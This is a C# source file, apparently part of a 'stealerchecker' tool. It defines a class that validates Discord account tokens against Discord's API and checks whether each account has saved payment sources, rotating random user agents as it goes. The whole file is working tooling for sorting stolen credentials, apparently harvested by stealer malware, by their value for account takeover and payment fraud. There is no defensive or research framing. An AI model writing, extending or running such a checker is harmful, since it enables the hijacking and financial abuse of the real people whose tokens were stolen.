using Leaf.xNet;
using Newtonsoft.Json;
using stealerchecker.Models;

namespace stealerchecker;

public static class DiscordChecker
{
    private const string DefaultCheck = "https://discord.com/api/v9/users/@me";
    private const string DefaultPayment = "https://discord.com/api/v9/users/@me/billing/payment-sources";

    private static readonly HttpRequest req = new()
    {
        UserAgent = Http.RandomUserAgent(),
        IgnoreProtocolErrors = true
    };

    public static CheckResult CheckToken(string token)
    {
        var result = new CheckResult(false, token);
        try
        {
            req.ClearAllHeaders();
            req.AddHeader("Authorization", token);

            var resp = req.Get(DefaultCheck);
            if (resp.IsOK)
            {
                var json = JsonConvert.DeserializeObject<ResponseModel>(resp.ToString());
                result.IsValid = json.Email != null && json.Phone != null && json.Verified;
            }
            else
            {
                return result;
            }

            if (result.IsValid)
            {
                req.ClearAllHeaders();
                req.AddHeader("Authorization", token);
                req.UserAgent = Http.RandomUserAgent();
                req.IgnoreProtocolErrors = true;

                var payments = req.Get(DefaultPayment);
                if (payments.IsOK && !payments.ToString().Equals("[]"))
                    result.Payment = true;
            }
            else
            {
                return result;
            }
        }
        catch
        {
            return result;
        }

        return result;
    }
}